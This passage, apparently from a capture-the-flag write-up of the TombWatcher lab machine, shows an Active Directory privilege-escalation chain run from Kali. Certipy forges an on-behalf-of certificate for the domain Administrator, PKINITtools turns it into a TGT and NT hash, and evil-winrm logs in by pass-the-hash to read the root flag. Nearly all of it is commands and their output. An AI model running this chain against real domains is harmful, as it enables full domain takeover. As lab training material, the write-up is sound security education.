Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

Forge Certificate as **Domain Admin:**  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/pywhisker/pywhisker]
└─$ certipy req -template 'User' -on-behalf-of 'TOMBWATCHER\Administrator' -pfx 'cert_admin.pfx' -ca 'tombwatcher-CA-1' -target 'dc01.tombwatcher.htb' -u 'cert_admin@tombwatcher.htb' -p 'certadmin' -dc-ip '10.10.11.72'

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Get **TGT** of **Administrator**:  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ python3 gettgtpkinit.py -cert-pfx /home/I3isk3t/usr-tools/hacking_active_directory/pywhisker/pywhisker/administrator.pfx -pfx-pass '' tombwatcher.htb/administrator administrator.ccache
2025-07-30 08:18:40,375 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-07-30 08:18:40,473 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-07-30 08:18:44,742 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-07-30 08:18:44,743 minikerberos INFO     42b48e035f2aaa044d21c96425b9799ab772232cb160bbe04acd9d7d0eb0ced8
INFO:minikerberos:42b48e035f2aaa044d21c96425b9799ab772232cb160bbe04acd9d7d0eb0ced8
2025-07-30 08:18:44,747 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

```

Extract **NT hash**:  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ export KRB5CCNAME=administrator.ccache

┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ python3 getnthash.py -key 42b48e035f2aaa044d21c96425b9799ab772232cb160bbe04acd9d7d0eb0ced8 tombwatcher.htb/administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
f61db423bebe3328d33af26741afe5fc
```

Access and grab the root flag:>  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ evil-winrm -i 10.10.11.72 -u administrator -H f61db423bebe3328d33af26741afe5fc
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
d21fd07543d263be5d2190d618a9f677
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
